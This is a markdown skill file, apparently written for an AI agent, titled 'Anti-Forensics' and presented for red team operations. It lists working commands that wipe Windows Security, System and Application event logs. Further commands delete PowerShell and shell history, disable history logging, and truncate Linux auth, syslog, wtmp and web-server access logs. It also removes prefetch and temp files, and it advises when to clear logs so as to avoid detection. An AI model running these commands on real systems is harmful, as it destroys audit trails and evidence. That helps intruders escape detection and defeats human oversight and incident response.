---
name: anti-forensics
description: Log cleanup and artifact removal for red team operations. Covers Windows Event Logs, Linux logs, shell history, and file cleanup.
---

# Anti-Forensics

## WARNING: Log manipulation is itself detectable
Clear only what's necessary. Incomplete clearing is MORE suspicious than no clearing.

## Windows Artifact Cleanup

### Event Logs
```powershell
# Clear specific event log (requires admin)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Clear specific event by ID (more stealthy)
# Requires PowerShell and admin rights
```

### PowerShell History
```bash
# Clear current session history
Clear-History

# Delete history file
del %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# Disable logging for future sessions
Set-PSReadLineOption -HistorySaveStyle SaveNothing
```

### Prefetch Files
```bash
del C:\Windows\Prefetch\* /q /f 2>nul
```

### DNS Cache
```bash
ipconfig /flushdns
```

## Linux Artifact Cleanup

### Shell History
```bash
# Clear current session
history -c

# Clear persisted history files
> ~/.bash_history
> ~/.history
> ~/.zsh_history

# Unset HISTFILE for current session
unset HISTFILE
```

### Log Files
```bash
# Auth log (requires root)
> /var/log/auth.log
> /var/log/secure

# General logs
> /var/log/syslog
> /var/log/messages
> /var/log/wtmp
> /var/log/btmp

# Apache/Nginx access logs (if web shell used)
> /var/log/apache2/access.log
> /var/log/nginx/access.log
```

### Temp File Cleanup
```bash
# Remove our artifacts
rm -f /tmp/.* 2>/dev/null
rm -rf /tmp/.cache/* 2>/dev/null
shred -u -z /tmp/sensitive_file 2>/dev/null
```

## Timing Considerations
- Clear logs **just before disengaging**, not after every action
- Don't clear ALL logs (suspicious) - clear only relevant entries if possible
- Some SIEMs forward logs in real-time; local clearing won't help
- Consider whether clearing is worth the detection risk
